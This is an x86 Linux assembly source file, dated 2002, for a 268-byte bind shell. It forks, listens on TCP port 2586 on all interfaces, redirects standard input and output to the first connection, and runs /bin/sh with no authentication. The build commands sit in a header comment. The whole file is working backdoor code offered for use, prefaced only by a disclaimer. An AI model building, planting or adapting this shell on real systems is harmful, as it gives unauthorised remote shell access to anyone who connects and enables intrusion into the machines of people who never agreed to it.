/*
 *
 * $Id: bind.s,v 0.1 2002/10/04 4:12:13 xenion Exp $
 *
 * ---------------------------------------------------------------------------
 * No part of this project may be used to break the law, or to cause damage of
 * any kind. And I'm not responsible for anything you do with it.
 * ---------------------------------------------------------------------------
 * "THE BEER-WARE LICENSE" (by Poul-Henning Kamp, Revision 42):
 * <xenion@acidlife.com> wrote this file.  As long as you retain this notice
 * you can do whatever you want with this stuff. If we meet some day, and you
 * think this stuff is worth it, you can buy me a beer in return.
 * xenion ~ Dallachiesa Michele
 * ---------------------------------------------------------------------------
 */

/*
binds a shell on 0.0.0.0:2586, the executable is only 268 bytes

gate$ gcc -Wall -s -nostartfiles -nostdlib bind.s -o bind
gate$ sstrip bind 
gate$ wc -c bind
    268 bind
gate$

*/	

        .globl _start

	pathname_shell: 
	.string "/bin/sh"

	_start:

	movl %esp,%ebp

	# fork()
	xorl %eax,%eax
	movb $0x02,%al 
	int $0x80   
	xorl %edx,%edx          # we'll have %edx = $0x0, for socket()
	cmp %eax,%ebx           # father or son ?
	jne  _exit              # father (or failed), exiting 

	#socket(AF_INET,SOCK_STREAM,IPPROTO_IP);
	movb $102,%dl
	movl %edx,%eax		# 102 = socketcall
	xorl %ecx,%ecx
        movl %ecx,%ebx
	incl %ebx	 	# socket()
	movl %ebx, -8(%ebp)	# 1 = SOCK_STREAM
	incl %ebx
	movl %ebx, -12(%ebp)	# 2 = AF_INET
	decl %ebx		# 1 = SYS_socket
	movl %ecx, -4(%ebp)	# 0 = IPPROTO_IP 
	leal -12(%ebp),%ecx	# put args in correct place
	int  $0x80		# switch to kernel-mode
	xorl %ecx,%ecx
	movl %eax,-12(%ebp)	# save the fd

	# bind(fd,(struct sockaddr *)&struct,16);
	incl %ebx
	movw %bx,-20(%ebp)	# 2 = AF_INET & 2 = SYS_bind
        movw $6666,-18(%ebp)    # 6666 = htons(2586)
	movl %ecx,-16(%ebp)	# 0 = INADDR_ANY
	leal -20(%ebp),%eax	# struct sockaddr
	movl %eax,-8(%ebp)	# load the struct
	movb $16,-4(%ebp)	# 16 = sizeof(struct sockaddr)
	movl %edx,%eax		# 102 = socketcall
	leal -12(%ebp),%ecx	# puts args in correct place
	int $0x80

	# listen(fd,something);
	# fd is at -12(%ebp) = %ecx
	movl %edx,%eax		# 102 = socketcall
	incl %ebx		# 2 * incl < addl
	incl %ebx		# 4 = SYS_listen 
	int  $0x80		

	# accept(fd,struct sockaddr,16);
	# struct sockaddr is at -8(%ebp)	
	movl %edx,%eax		# shoot yourself
	incl %ebx		# 5 = SYS_accept
	#%ecx = -12(%ebp)#
        movl %ebp,-4(%ebp)      # !?
	int  $0x80
	movl %eax,%ebx		# save new fd

	# dup2(fd,0)
	xorl %ecx,%ecx
	movb $63,%dl		# 63 = dup2()
	movl %edx,%eax
	int  $0x80

	#dup2(fd,1)
	movl %edx,%eax
	incl %ecx
	int  $0x80

        #dup2(fd,2)
        movl %edx,%eax
        incl %ecx
        int  $0x80

	# arg[0] = "/bin/sh"
	# arg[1] = 0x0
	# execve(arg[0],arg);

	movl $pathname_shell, 0x8(%ebp)
	movl $0x0, 0xc(%ebp)
	movl 0x8(%ebp), %ebx
	leal 0x8(%ebp), %ecx
	leal 0xc(%ebp),%edx
	movl $0xb, %eax
	int  $0x80

_exit:
        incl %edx
        movl %edx, %eax
        int $0x80

#EOF
